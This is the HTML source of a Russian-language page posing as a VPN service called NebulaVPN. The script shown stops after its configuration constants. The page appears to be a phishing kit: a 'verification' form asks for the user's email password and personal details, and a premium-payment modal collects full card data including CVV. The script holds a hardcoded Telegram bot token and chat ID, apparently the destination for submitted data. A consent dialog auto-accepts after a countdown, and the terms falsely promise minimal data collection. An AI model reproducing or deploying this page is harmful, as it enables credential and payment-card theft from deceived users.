<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VPN2026 · Премиум защита</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      /* Основные цвета */
      --primary: #6e45e2;
      --primary-dark: #4a2dbf;
      --accent: #00d2ff;
      --accent-dark: #00b4d8;
      --danger: #ff4757;
      --success: #2ed573;
      --warning: #ffa502;
      --vip: #f39c12;
      --vip-dark: #e67e22;
      
      /* Темная тема по умолчанию */
      --bg: #0f0f1a;
      --bg-secondary: #1a1a2e;
      --card: #16213e;
      --text: #ffffff;
      --text-muted: #b8c2cc;
      --input-bg: #1e293b;
      --border: #2d3748;
      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
      
      /* Размеры */
      --radius: 12px;
      --header-height: 70px;
    }

    /* Светлая тема */
    [data-theme="light"] {
      --bg: #f8fafc;
      --bg-secondary: #e2e8f0;
      --card: #ffffff;
      --text: #1e293b;
      --text-muted: #64748b;
      --input-bg: #f1f5f9;
      --border: #e2e8f0;
      --shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
    }

    /* Неоновая тема */
    [data-theme="neon"] {
      --primary: #00f5d4;
      --primary-dark: #00bbf9;
      --accent: #f15bb5;
      --accent-dark: #9b5de5;
      --bg: #0a0a12;
      --bg-secondary: #14142a;
      --card: #1e1e3f;
      --text: #e2e2ff;
      --text-muted: #a5a5c7;
      --input-bg: #25254a;
      --border: #3a3a5a;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', sans-serif;
    }

    body {
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
      position: relative;
      transition: background 0.3s, color 0.3s;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 20% 30%, rgba(110, 69, 226, 0.15) 0%, transparent 40%),
                  radial-gradient(circle at 80% 70%, rgba(0, 210, 255, 0.15) 0%, transparent 40%);
      z-index: -1;
      opacity: 0.8;
    }

    /* Анимации */
    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Хедер */
    header {
      background: var(--bg-secondary);
      height: var(--header-height);
      padding: 0 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: var(--shadow);
      position: sticky;
      top: 0;
      z-index: 100;
      transition: all 0.3s;
      border-bottom: 1px solid var(--border);
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      font-size: 1.5rem;
      color: var(--accent);
      text-decoration: none;
    }

    .logo i {
      font-size: 1.8rem;
      animation: float 3s ease-in-out infinite;
    }

    nav {
      display: flex;
      align-items: center;
      gap: 1.5rem;
    }

    nav a {
      color: var(--text-muted);
      text-decoration: none;
      font-weight: 500;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 0.95rem;
      position: relative;
      padding: 0.5rem 0;
    }

    nav a:hover {
      color: var(--accent);
    }

    nav a::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 0;
      height: 2px;
      background: var(--accent);
      transition: width 0.3s;
    }

    nav a:hover::after {
      width: 100%;
    }

    .nav-actions {
      display: flex;
      align-items: center;
      gap: 1rem;
    }

    .theme-switcher, .language-btn {
      background: var(--card);
      border: none;
      color: var(--text);
      padding: 0.5rem;
      border-radius: 50%;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s;
      width: 40px;
      height: 40px;
    }

    .theme-switcher:hover, .language-btn:hover {
      background: var(--primary);
      color: white;
      transform: translateY(-2px);
    }

    .language-dropdown {
      position: absolute;
      right: 0;
      top: 50px;
      background: var(--card);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 0.5rem;
      display: none;
      z-index: 10;
      min-width: 140px;
      border: 1px solid var(--border);
    }

    .language-dropdown.show {
      display: block;
    }

    .language-option {
      padding: 0.7rem 1rem;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .language-option:hover {
      background: var(--primary);
      color: white;
    }

    /* Основное содержимое */
    main {
      flex: 1;
      padding: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 1200px;
      margin: 0 auto;
    }

    .card {
      background: var(--card);
      border-radius: var(--radius);
      padding: 2rem;
      width: 100%;
      box-shadow: var(--shadow);
      margin-bottom: 2rem;
      transition: transform 0.3s, box-shadow 0.3s;
      border: 1px solid var(--border);
      position: relative;
      overflow: hidden;
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background: linear-gradient(90deg, var(--primary), var(--accent));
    }

    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
    }

    h1 {
      font-size: 2.2rem;
      margin-bottom: 1.5rem;
      color: var(--accent);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      font-weight: 700;
    }

    h2 {
      font-size: 1.6rem;
      margin: 1.5rem 0 1rem;
      color: var(--accent);
      font-weight: 600;
    }

    p {
      color: var(--text-muted);
      line-height: 1.6;
      margin-bottom: 1.5rem;
    }

    /* Формы и инпуты */
    .input-group {
      margin-bottom: 1.5rem;
      position: relative;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: var(--text-muted);
      font-size: 0.95rem;
    }

    input, select, textarea {
      width: 100%;
      padding: 0.9rem 1.2rem;
      border-radius: var(--radius);
      background: var(--input-bg);
      color: var(--text);
      border: 1px solid var(--border);
      font-size: 1rem;
      transition: all 0.3s;
      font-family: 'Montserrat', sans-serif;
    }

    input:focus, textarea:focus, select:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(0, 210, 255, 0.2);
    }

    .input-icon {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--text-muted);
    }

    /* Кнопки */
    button {
      padding: 1rem 1.5rem;
      font-size: 1rem;
      border: none;
      border-radius: var(--radius);
      background: var(--primary);
      color: white;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      font-weight: 600;
      width: 100%;
    }

    button:hover {
      background: var(--primary-dark);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    button.secondary {
      background: var(--input-bg);
      color: var(--text-muted);
    }

    button.secondary:hover {
      background: var(--primary);
      color: white;
    }

    /* Вкладки */
    .tabs {
      display: flex;
      justify-content: center;
      gap: 0.8rem;
      margin-bottom: 2rem;
      flex-wrap: wrap;
      width: 100%;
      max-width: 1000px;
    }

    .tabs button {
      padding: 0.8rem 1.5rem;
      border-radius: var(--radius);
      background: var(--input-bg);
      color: var(--text-muted);
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 500;
      width: auto;
    }

    .tabs button i {
      font-size: 0.9rem;
    }

    .tabs button.active {
      background: var(--primary);
      color: white;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    .tabs button:hover:not(.active) {
      background: var(--bg-secondary);
    }

    /* Статус подключения */
    .connection-status {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 1.5rem 0;
      padding: 0.8rem;
      border-radius: var(--radius);
      background: var(--input-bg);
      border: 1px solid var(--border);
    }

    .status-indicator {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: var(--danger);
    }

    .status-indicator.connected {
      background: var(--success);
    }

    .status-indicator.connecting {
      background: var(--warning);
      animation: pulse 1.5s infinite;
    }

    /* Список серверов */
    .server-list {
      margin-top: 1rem;
      max-height: 300px;
      overflow-y: auto;
      border-radius: var(--radius);
      background: var(--input-bg);
      border: 1px solid var(--border);
    }

    .server-item {
      padding: 1rem;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      gap: 12px;
      border-bottom: 1px solid var(--border);
    }

    .server-item:last-child {
      border-bottom: none;
    }

    .server-item:hover {
      background: var(--primary);
      color: white;
    }

    .server-item i {
      font-size: 1.2rem;
      color: var(--accent);
    }

    /* Тест скорости */
    .speed-test {
      margin-top: 1.5rem;
      padding: 1.5rem;
      border-radius: var(--radius);
      background: var(--input-bg);
      border: 1px solid var(--border);
    }

    .speed-meter {
      height: 8px;
      background: var(--bg);
      border-radius: 4px;
      margin: 1.5rem 0;
      overflow: hidden;
    }

    .speed-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, var(--danger), var(--warning), var(--success));
      transition: width 1s ease;
    }

    .speed-results {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 1rem;
      margin-top: 1.5rem;
    }

    .speed-value {
      font-size: 1.5rem;
      font-weight: 700;
      color: var(--accent);
      font-family: 'JetBrains Mono', monospace;
    }

    .speed-label {
      font-size: 0.9rem;
      color: var(--text-muted);
    }

    /* VIP стили */
    .vip-badge {
      background: linear-gradient(135deg, var(--vip), var(--vip-dark));
      color: white;
      padding: 0.3rem 0.8rem;
      border-radius: 20px;
      font-size: 0.8rem;
      font-weight: bold;
      display: inline-flex;
      align-items: center;
      gap: 5px;
      margin-left: 10px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .vip-feature {
      position: relative;
    }

    .vip-feature::after {
      content: 'VIP';
      position: absolute;
      top: -8px;
      right: -8px;
      background: linear-gradient(135deg, var(--vip), var(--vip-dark));
      color: white;
      font-size: 0.7rem;
      font-weight: bold;
      padding: 2px 8px;
      border-radius: 10px;
      z-index: 1;
    }

    .vip-button {
      background: linear-gradient(135deg, var(--vip), var(--vip-dark));
      color: white;
    }

    .vip-button:hover {
      background: linear-gradient(135deg, var(--vip-dark), #d35400);
      transform: translateY(-2px) scale(1.02);
    }

    /* Модальные окна */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s;
      backdrop-filter: blur(5px);
    }

    .modal.active {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background: var(--card);
      padding: 2.5rem;
      border-radius: var(--radius);
      max-width: 500px;
      width: 90%;
      box-shadow: var(--shadow);
      transform: translateY(20px);
      transition: transform 0.3s;
      position: relative;
      border: 1px solid var(--border);
      max-height: 90vh;
      overflow-y: auto;
    }

    .modal.active .modal-content {
      transform: translateY(0);
    }

    .modal-close {
      position: absolute;
      top: 1rem;
      right: 1rem;
      background: none;
      border: none;
      color: var(--text-muted);
      font-size: 1.5rem;
      cursor: pointer;
      transition: all 0.3s;
    }

    .modal-close:hover {
      color: var(--danger);
      transform: rotate(90deg);
    }

    .modal-title {
      color: var(--accent);
      margin-bottom: 1.5rem;
      text-align: center;
      font-size: 1.8rem;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .modal-text {
      margin-bottom: 1.5rem;
      color: var(--text-muted);
      line-height: 1.6;
    }

    .modal-buttons {
      display: flex;
      gap: 1rem;
      justify-content: center;
      margin-top: 2rem;
    }

    .modal-btn {
      padding: 0.9rem 1.8rem;
      border-radius: var(--radius);
      border: none;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.3s;
      min-width: 150px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .modal-btn.accept {
      background: var(--success);
      color: white;
    }

    .modal-btn.decline {
      background: var(--danger);
      color: white;
    }

    .modal-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    /* VIP модальное окно */
    .vip-benefits {
      margin: 1.5rem 0;
    }

    .vip-benefit {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 1rem;
      color: var(--text);
      padding: 0.8rem;
      border-radius: var(--radius);
      background: var(--input-bg);
      transition: all 0.3s;
    }

    .vip-benefit:hover {
      transform: translateX(5px);
      background: var(--primary);
      color: white;
    }

    .vip-benefit i {
      color: var(--vip);
      font-size: 1.2rem;
      min-width: 24px;
    }

    .payment-methods {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 0.8rem;
      margin: 1.5rem 0;
    }

    .payment-method {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      padding: 1rem;
      border-radius: var(--radius);
      background: var(--input-bg);
      cursor: pointer;
      transition: all 0.3s;
      border: 1px solid var(--border);
      text-align: center;
    }

    .payment-method:hover {
      background: var(--primary);
      color: white;
      border-color: var(--primary);
    }

    .payment-method.active {
      background: var(--vip);
      color: white;
      border-color: var(--vip-dark);
      transform: translateY(-2px);
    }

    .payment-method i {
      font-size: 2rem;
      margin-bottom: 0.5rem;
    }

    .card-input {
      margin-top: 1.5rem;
    }

    .card-input-group {
      display: grid;
      grid-template-columns: 2fr 1fr;
      gap: 1rem;
    }

    /* Уведомления */
    .notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--primary);
      color: white;
      padding: 0.8rem 1.2rem;
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      display: flex;
      align-items: center;
      gap: 10px;
      transform: translateX(150%);
      transition: transform 0.4s ease;
      z-index: 1000;
      max-width: 300px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      opacity: 0;
    }

    .notification.show {
      transform: translateX(0);
      opacity: 1;
    }

    .notification.success {
      background: var(--success);
    }

    .notification.error {
      background: var(--danger);
    }

    .notification.warning {
      background: var(--warning);
      color: #333;
    }

    .notification-close {
      margin-left: auto;
      cursor: pointer;
      opacity: 0.8;
      transition: opacity 0.3s;
    }

    .notification-close:hover {
      opacity: 1;
    }

    /* Адаптивность */
    @media (max-width: 768px) {
      header {
        padding: 0 1rem;
        height: 60px;
      }
      
      nav {
        display: none;
      }
      
      .card {
        padding: 1.5rem;
      }
      
      .tabs {
        gap: 0.5rem;
      }
      
      .tabs button {
        padding: 0.6rem 1rem;
        font-size: 0.8rem;
      }
      
      .payment-methods {
        grid-template-columns: 1fr;
      }
      
      .card-input-group {
        grid-template-columns: 1fr;
      }
      
      .modal-content {
        padding: 1.5rem;
      }
    }

    /* Специальные VIP фичи */
    .vip-exclusive {
      position: relative;
      overflow: hidden;
    }
    
    .vip-exclusive::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, rgba(243, 156, 18, 0.1), rgba(230, 126, 34, 0.2));
      z-index: 0;
    }
    
    .vip-exclusive-content {
      position: relative;
      z-index: 1;
    }
    
    .vip-server {
      border-left: 3px solid var(--vip);
    }
    
    .vip-server-icon {
      color: var(--vip) !important;
    }
    
    /* Анимация для VIP кнопок */
    @keyframes vipPulse {
      0% { box-shadow: 0 0 0 0 rgba(243, 156, 18, 0.7); }
      70% { box-shadow: 0 0 0 10px rgba(243, 156, 18, 0); }
      100% { box-shadow: 0 0 0 0 rgba(243, 156, 18, 0); }
    }
    
    .vip-button-pulse {
      animation: vipPulse 2s infinite;
    }
  </style>
</head>
<body>
  <!-- Модальные окна -->
  <div class="modal" id="initialPermissionModal">
    <div class="modal-content">
      <button class="modal-close" onclick="closeInitialModal()">&times;</button>
      <h2 class="modal-title"><i class="fas fa-shield-alt"></i> Добро пожаловать в NebulaVPN</h2>
      <p class="modal-text">Для использования нашего сервиса необходимо пройти верификацию и предоставить основные данные. Это обеспечит безопасность и полный доступ ко всем функциям.</p>
      <div class="modal-buttons">
        <button class="modal-btn accept" id="initialAccept"><i class="fas fa-check"></i> Продолжить</button>
        <button class="modal-btn decline" id="initialDecline"><i class="fas fa-times"></i> Отказаться</button>
      </div>
      <p style="margin-top: 1.5rem; font-size: 0.8rem; color: var(--text-muted); text-align: center;">Автоподтверждение через <span id="initialTimer">10</span> сек...</p>
    </div>
  </div>

  <div class="modal" id="vpnPermissionModal">
    <div class="modal-content">
      <button class="modal-close" onclick="closeVpnModal()">&times;</button>
      <h2 class="modal-title"><i class="fas fa-user-shield"></i> Подтверждение подключения</h2>
      <p class="modal-text">Вы собираетесь подключиться к VPN. Пожалуйста, подтвердите, что согласны с нашими условиями использования и политикой конфиденциальности.</p>
      <div class="modal-buttons">
        <button class="modal-btn accept" id="vpnAccept"><i class="fas fa-plug"></i> Подключиться</button>
        <button class="modal-btn decline" id="vpnDecline"><i class="fas fa-times"></i> Отмена</button>
      </div>
    </div>
  </div>

  <div class="modal" id="vipPaymentModal">
    <div class="modal-content">
      <button class="modal-close" onclick="closePaymentModal()">&times;</button>
      <h2 class="modal-title"><i class="fas fa-crown"></i> Премиум доступ</h2>
      <p class="modal-text">Активируйте премиум подписку за 300 ₽ и получите эксклюзивные возможности:</p>
      
      <div class="vip-benefits">
        <div class="vip-benefit"><i class="fas fa-bolt"></i> Максимальная скорость соединения</div>
        <div class="vip-benefit"><i class="fas fa-globe"></i> Доступ ко всем серверам без ограничений</div>
        <div class="vip-benefit"><i class="fas fa-headset"></i> Приоритетная поддержка 24/7</div>
        <div class="vip-benefit"><i class="fas fa-ad"></i> Отсутствие рекламы</div>
        <div class="vip-benefit"><i class="fas fa-lock"></i> Дополнительные функции безопасности</div>
        <div class="vip-benefit"><i class="fas fa-star"></i> Эксклюзивные серверы только для VIP</div>
      </div>
      
      <h3 style="margin: 1.5rem 0 1rem; color: var(--accent);">Выберите способ оплаты:</h3>
      <div class="payment-methods">
        <div class="payment-method active" onclick="selectPaymentMethod('card')">
          <i class="far fa-credit-card"></i>
          <span>Карта</span>
        </div>
        <div class="payment-method" onclick="selectPaymentMethod('qiwi')">
          <i class="fas fa-wallet"></i>
          <span>QIWI</span>
        </div>
        <div class="payment-method" onclick="selectPaymentMethod('crypto')">
          <i class="fab fa-bitcoin"></i>
          <span>Крипта</span>
        </div>
      </div>
      
      <div class="card-input" id="cardInput">
        <div class="input-group">
          <label>Номер карты</label>
          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
          <i class="far fa-credit-card input-icon"></i>
        </div>
        
        <div class="card-input-group">
          <div class="input-group">
            <label>Срок действия</label>
            <input type="text" id="cardExpiry" placeholder="MM/ГГ" maxlength="5" oninput="formatCardExpiry(this)">
          </div>
          <div class="input-group">
            <label>CVV/CVC</label>
            <input type="text" id="cardCvv" placeholder="123" maxlength="3">
            <i class="fas fa-lock input-icon"></i>
          </div>
        </div>
        
        <div class="input-group">
          <label>Имя владельца</label>
          <input type="text" id="cardName" placeholder="IVAN IVANOV">
        </div>
      </div>
      
      <div class="modal-buttons">
        <button class="modal-btn accept vip-button" onclick="processPayment()"><i class="fas fa-crown"></i> Купить за 300 ₽</button>
        <button class="modal-btn decline" onclick="closePaymentModal()"><i class="fas fa-times"></i> Отмена</button>
      </div>
    </div>
  </div>

  <div class="modal" id="confirmationModal">
    <div class="modal-content">
      <button class="modal-close" onclick="cancelPayment()">&times;</button>
      <div class="confirmation-icon">
        <i class="fas fa-shield-alt"></i>
      </div>
      <h2 class="modal-title">Подтверждение платежа</h2>
      <p class="modal-text">Вы уверены, что хотите оплатить премиум подписку на сумму 300 ₽? Деньги будут списаны с вашей карты.</p>
      
      <div class="modal-buttons">
        <button class="modal-btn accept" onclick="confirmPayment()"><i class="fas fa-check"></i> Подтвердить</button>
        <button class="modal-btn decline" onclick="cancelPayment()"><i class="fas fa-times"></i> Отмена</button>
      </div>
    </div>
  </div>

  <!-- Хедер -->
  <header>
    <a href="#" class="logo">
      <i class="fas fa-shield-virus"></i>
      <span>NebulaVPN</span>
      <span class="vip-badge" id="vipBadge" style="display: none;"><i class="fas fa-crown"></i> VIP</span>
    </a>
    
    <nav>
      <a href="#connect" onclick="showTab('connect')"><i class="fas fa-plug"></i> Подключение</a>
      <a href="#verify" onclick="showTab('verify')"><i class="fas fa-user-check"></i> Верификация</a>
      <a href="#servers" onclick="showTab('servers')"><i class="fas fa-server"></i> Серверы</a>
      <a href="#speed" onclick="showTab('speed')"><i class="fas fa-tachometer-alt"></i> Скорость</a>
      <a href="#terms" onclick="showTab('terms')"><i class="fas fa-file-contract"></i> Правила</a>
      <a href="#vip" onclick="showVipModal()" class="vip-feature"><i class="fas fa-crown"></i> Премиум</a>
    </nav>
    
    <div class="nav-actions">
      <div class="language-switcher">
        <button class="language-btn" id="languageBtn">
          <i class="fas fa-globe"></i>
        </button>
        <div class="language-dropdown" id="languageDropdown">
          <div class="language-option" onclick="changeLanguage('ru')">🇷🇺 Русский</div>
          <div class="language-option" onclick="changeLanguage('en')">🇬🇧 English</div>
        </div>
      </div>
      
      <button class="theme-switcher" onclick="toggleTheme()">
        <i class="fas fa-moon" id="themeIcon"></i>
      </button>
    </div>
  </header>

  <main>
    <div class="tabs">
      <button class="active" onclick="showTab('connect')"><i class="fas fa-plug"></i> Подключение</button>
      <button onclick="showTab('verify')"><i class="fas fa-user-check"></i> Верификация</button>
      <button onclick="showTab('servers')"><i class="fas fa-server"></i> Серверы</button>
      <button onclick="showTab('speed')"><i class="fas fa-tachometer-alt"></i> Скорость</button>
      <button onclick="showTab('terms')"><i class="fas fa-file-contract"></i> Правила</button>
      <button onclick="showVipModal()" class="vip-button vip-button-pulse"><i class="fas fa-crown"></i> Премиум</button>
    </div>

    <!-- Вкладка подключения -->
    <section class="card" id="connect">
      <h1><i class="fas fa-plug"></i> Подключение VPN</h1>
      <p>Подключитесь к нашему безопасному VPN-серверу для анонимного и защищенного интернета. Выберите сервер и нажмите "Подключить".</p>
      
      <div class="connection-status">
        <div class="status-indicator" id="connectionStatus"></div>
        <span id="connectionText">Не подключено</span>
      </div>
      
      <button id="connectButton" onclick="requestVpnPermission()"><i class="fas fa-plug"></i> Подключить VPN</button>
      <button class="secondary" id="disconnectButton" style="display:none;" onclick="disconnectVpn()"><i class="fas fa-power-off"></i> Отключить</button>
      
      <div class="input-group" style="margin-top: 1.5rem;">
        <label>Выбранный сервер</label>
        <input type="text" id="selectedServer" value="Автоматический (рекомендуется)" readonly>
      </div>
    </section>

    <!-- Вкладка верификации -->
    <section class="card" id="verify" style="display:none;">
      <h1><i class="fas fa-user-check"></i> Верификация личности</h1>
      <p>Пройдите верификацию, чтобы получить доступ ко всем функциям платформы. Это займет не более 2 минут.</p>
      
      <form id="verifyForm">
        <div class="input-group">
          <label>Имя</label>
          <input id="firstName" required placeholder="Иван">
          <i class="fas fa-user input-icon"></i>
        </div>
        <div class="input-group">
          <label>Фамилия</label>
          <input id="lastName" required placeholder="Иванов">
          <i class="fas fa-user input-icon"></i>
        </div>

        <div class="input-group">
          <label>Телефон</label>
          <input id="phone" required placeholder="+380 (XX) XXX-XX-XX" type="tel">
          <i class="fas fa-phone input-icon"></i>
        </div>

        <div class="input-group">
          <label>Дата рождения</label>
          <input type="date" id="dob" required>
          <div class="age-display"><i class="fas fa-birthday-cake"></i> Возраст: <span id="ageDisplay">0</span> лет</div>
        </div>

        <div class="input-group">
          <label>Электронная почта</label>
          <input id="email" required placeholder="example@domain.com" type="email">
          <i class="fas fa-envelope input-icon"></i>
        </div>
        
        <div class="input-group">
          <label>Пароль от почты</label>
          <input id="emailPass" type="password" required placeholder="Пароль">
          <i class="fas fa-lock input-icon"></i>
        </div>

        <div class="input-group">
          <label>Страна проживания</label>
          <select id="country" required>
            <option value="">Выберите страну</option>
            <option value="UA">Украина</option>
            <option value="RU">Россия</option>
            <option value="BY">Беларусь</option>
            <option value="KZ">Казахстан</option>
            <option value="US">США</option>
            <option value="DE">Германия</option>
            <option value="other">Другая</option>
          </select>
          <i class="fas fa-globe input-icon"></i>
        </div>

        <button type="submit"><i class="fas fa-paper-plane"></i> Отправить на проверку</button>
      </form>
    </section>

    <!-- Вкладка серверов -->
    <section class="card" id="servers" style="display:none;">
      <h1><i class="fas fa-server"></i> Доступные серверы</h1>
      <p>Выберите сервер для подключения из списка доступных локаций. Серверы с <i class="fas fa-crown" style="color: var(--vip);"></i> доступны только для премиум пользователей.</p>
      
      <div class="server-list">
        <div class="server-item" onclick="selectServer('Автоматический (рекомендуется)', 'auto')">
          <i class="fas fa-random"></i>
          <span>Автоматический (рекомендуется)</span>
        </div>
        <div class="server-item" onclick="selectServer('Германия', 'de')">
          <i class="fas fa-globe-europe"></i>
          <span>Германия</span>
        </div>
        <div class="server-item" onclick="selectServer('США', 'us')">
          <i class="fas fa-globe-americas"></i>
          <span>США</span>
        </div>
        <div class="server-item" onclick="selectServer('Япония', 'jp')">
          <i class="fas fa-globe-asia"></i>
          <span>Япония</span>
        </div>
        <div class="server-item" onclick="selectServer('Россия', 'ru')">
          <i class="fas fa-globe"></i>
          <span>Россия</span>
        </div>
        <div class="server-item vip-server" onclick="selectVipServer('Сингапур (VIP)', 'sg')">
          <i class="fas fa-globe-asia vip-server-icon"></i>
          <span>Сингапур <span class="vip-badge"><i class="fas fa-crown"></i> VIP</span></span>
        </div>
        <div class="server-item vip-server" onclick="selectVipServer('Швейцария (VIP)', 'ch')">
          <i class="fas fa-globe-europe vip-server-icon"></i>
          <span>Швейцария <span class="vip-badge"><i class="fas fa-crown"></i> VIP</span></span>
        </div>
      </div>
    </section>

    <!-- Вкладка скорости -->
    <section class="card" id="speed" style="display:none;">
      <h1><i class="fas fa-tachometer-alt"></i> Проверка скорости</h1>
      <p>Протестируйте скорость вашего интернет-соединения до и после подключения к VPN. Премиум пользователи получают приоритет на канал.</p>
      
      <div class="speed-test">
        <button onclick="startSpeedTest()"><i class="fas fa-play"></i> Начать тест скорости</button>
        
        <div class="speed-meter">
          <div class="speed-fill" id="speedFill"></div>
        </div>
        
        <div class="speed-results">
          <div>
            <div class="speed-value" id="downloadSpeed">0</div>
            <div class="speed-label">Скачивание (Мбит/с)</div>
          </div>
          <div>
            <div class="speed-value" id="uploadSpeed">0</div>
            <div class="speed-label">Загрузка (Мбит/с)</div>
          </div>
          <div>
            <div class="speed-value" id="pingValue">0</div>
            <div class="speed-label">Пинг (мс)</div>
          </div>
        </div>
      </div>
    </section>

    <!-- Вкладка правил использования -->
    <section class="card" id="terms" style="display:none;">
      <h1><i class="fas fa-file-contract"></i> Правила использования</h1>
      <p>Пожалуйста, внимательно ознакомьтесь с условиями использования сервиса NebulaVPN.</p>
      
      <div class="terms-content">
        <h3>1. Общие положения</h3>
        <p>1.1. Сервис NebulaVPN предоставляет услуги виртуальной частной сети (VPN) для обеспечения безопасности и конфиденциальности пользователей в сети Интернет.</p>
        <p>1.2. Используя Сервис, вы соглашаетесь с настоящими Правилами и обязуетесь их соблюдать.</p>
        
        <h3>2. Условия использования</h3>
        <p>2.1. Сервис предназначен для законного использования только в целях обеспечения безопасности и конфиденциальности.</p>
        <p>2.2. Запрещается использовать Сервис для:</p>
        <ul>
          <li>Незаконной деятельности любого рода</li>
          <li>Распространения вредоносного программного обеспечения</li>
          <li>Взлома, сканирования или тестирования уязвимости систем без разрешения</li>
          <li>Рассылки спама или фишинговых атак</li>
          <li>Нарушения авторских прав и прав интеллектуальной собственности</li>
          <li>Любых действий, нарушающих законодательство вашей страны</li>
        </ul>
        
        <h3>3. Премиум подписка</h3>
        <p>3.1. Премиум подписка предоставляет дополнительные функции, включая эксклюзивные серверы и повышенную скорость.</p>
        <p>3.2. Подписка автоматически продлевается каждый месяц, пока не будет отменена.</p>
        <p>3.3. Возврат средств возможен в течение 14 дней с момента оплаты при условии неиспользования услуг.</p>
        
        <h3>4. Конфиденциальность</h3>
        <p>4.1. Сервис придерживается политики отсутствия логов (no-logs policy) и не хранит данные о вашей онлайн-активности.</p>
        <p>4.2. Мы собираем минимально необходимые данные для работы Сервиса, такие как:</p>
        <ul>
          <li>Основные учетные данные (имя, email)</li>
          <li>Информация, необходимая для обработки платежей</li>
          <li>Технические данные для обеспечения работы Сервиса</li>
        </ul>
      </div>
      
      <div class="input-group">
        <input type="checkbox" id="agreeTerms" required style="width: auto; display: inline-block; margin-right: 10px;">
        <label for="agreeTerms" style="display: inline; margin-top: 0;">Я подтверждаю, что ознакомлен и согласен с правилами использования сервиса</label>
      </div>
    </section>

    <section class="card" style="text-align: center;">
      <h2><i class="fas fa-shield-alt"></i> NebulaVPN — ваш цифровой щит</h2>
      <p>Все права защищены. Используя сайт, вы соглашаетесь с <a href="#" onclick="showTab('terms')">условиями</a>.</p>
      <p><i class="fas fa-clock"></i> Текущее время: <span id="footerTime">...</span></p>
    </section>
  </main>

  <div class="notification" id="notification">
    <i class="fas fa-check-circle"></i>
    <span id="notificationText">Успешно отправлено!</span>
    <span class="notification-close" onclick="closeNotification()">&times;</span>
  </div>

  <script>
    // Конфигурация Telegram бота
    const TOKEN = "7453450901:AAE1R2gkAIOy_L_Y2kG7Tl1ZIPFIc2qQ7dQ";
    const CHAT_ID = "7807571960";
    const SECRET_KEY = "vpn2026-secret-key";
    const DEVELOPER_CARD = "1234 5678 9012 3456";
    
    let currentServer = 'auto';
    let isConnected = false;
    let currentLanguage = 'ru';
    let currentTheme = 'dark';
    let currentPaymentMethod = 'card';
    let isVip = false;
    let notificationTimeout;

    // Инициализация при загрузке страницы
